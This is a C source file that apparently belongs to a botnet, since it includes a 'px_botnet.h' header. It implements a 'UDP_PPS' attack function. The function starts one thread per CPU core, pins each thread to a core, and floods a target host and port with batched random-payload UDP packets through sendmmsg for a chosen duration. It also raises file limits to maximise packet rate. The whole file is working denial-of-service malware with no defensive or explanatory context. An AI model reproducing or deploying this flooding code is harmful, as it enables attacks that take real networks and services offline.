#include "../../includes/px_botnet.h"
#define MAX_CHARS 70
#define TIME_UPDATE_INTERVAL 1000
#define NUM_MSGS 100
#define RAND_STR_COUNT 10000  // Amount of pre-generated random strings.

struct arginfo {
    unsigned char *host;
    int port, seconds, power, packet_size, sock;
};

unsigned long lcg_rand(unsigned long a) {
    return (a * 279470273UL) % 4294967291UL;
}

void zrand_string(char *string, int len, unsigned long seed) {
    const char zchars[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*()";
    const unsigned int char_len = sizeof(zchars) - 1;
    unsigned long r = seed;
    for (int i = 0; i < len; i++) {
        r = lcg_rand(r);
        string[i] = zchars[r % char_len];
    }
    string[len] = '\0';
}

char rand_strings[RAND_STR_COUNT][MAX_CHARS];

void generate_rand_strings(int count, int len) {
    for (int i = 0; i < count; i++) {
        zrand_string(rand_strings[i], len, time(NULL) ^ i);
    }
}

void *thread_func(void *args) {
    struct arginfo *args_ptr = (struct arginfo *)args;

    srand(time(NULL) ^ (long)pthread_self());
    struct sockaddr_in addr;

    addr.sin_family = AF_INET;
    addr.sin_port = htons(args_ptr->port);
    addr.sin_addr.s_addr = inet_addr(args_ptr->host);

    struct mmsghdr msgs[NUM_MSGS] = {0};
    struct iovec iovecs[NUM_MSGS];

    for (int i = 0; i < NUM_MSGS; i++) {
        iovecs[i].iov_base = rand_strings[i % RAND_STR_COUNT];
        iovecs[i].iov_len = args_ptr->packet_size;

        msgs[i].msg_hdr.msg_name = &addr;
        msgs[i].msg_hdr.msg_namelen = sizeof(addr);
        msgs[i].msg_hdr.msg_iov = &iovecs[i];
        msgs[i].msg_hdr.msg_iovlen = 1;
    }

    time_t start_time = time(NULL);
    time_t end_time = start_time + args_ptr->seconds;
    time_t current_time = start_time;
    int count = 0;

    while (current_time < end_time) {
        sendmmsg(args_ptr->sock, msgs, NUM_MSGS, 0);
        if (++count % TIME_UPDATE_INTERVAL == 0) {
            current_time = time(NULL);
        }
    }

    pthread_exit(NULL);
}

void UDP_PPS(unsigned char *host, int port, int seconds, int packet_size) {
    int power = get_nprocs();
    pthread_t threads[power];
    struct arginfo args[power];

    generate_rand_strings(RAND_STR_COUNT, packet_size);

        
    struct rlimit rl;
    getrlimit(RLIMIT_NOFILE, &rl);

    rl.rlim_cur = 4096;  // New soft limit
    rl.rlim_max = 4096;  // New hard limit

    if (setrlimit(RLIMIT_NOFILE, &rl) != 0) {
        perror("setrlimit");
        exit(EXIT_FAILURE);
    }


    for (int i = 0; i < power; i++) {
        int sock;
        if ((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1) {
            perror("socket");
            exit(1);
        }

        int optval = 1;
        setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
        setsockopt(sock, SOL_SOCKET, SO_REUSEPORT, &optval, sizeof(optval));

        int flags = fcntl(sock, F_GETFL, 0);
        fcntl(sock, F_SETFL, flags | O_NONBLOCK);

        args[i].host = host;
        args[i].port = port;
        args[i].seconds = seconds;
        args[i].power = power;
        args[i].packet_size = packet_size;
        args[i].sock = sock;

        if (pthread_create(&threads[i], NULL, thread_func, &args[i]) != 0) {
            perror("pthread_create");
            exit(1);
        }

        // Set thread affinity to different CPU cores if available
        cpu_set_t cpuset;
        CPU_ZERO(&cpuset);
        CPU_SET(i % power, &cpuset);
        pthread_setaffinity_np(threads[i], sizeof(cpu_set_t), &cpuset);
    }

    for (int i = 0; i < power; i++) {
        pthread_join(threads[i], NULL);
        close(args[i].sock);
    }
}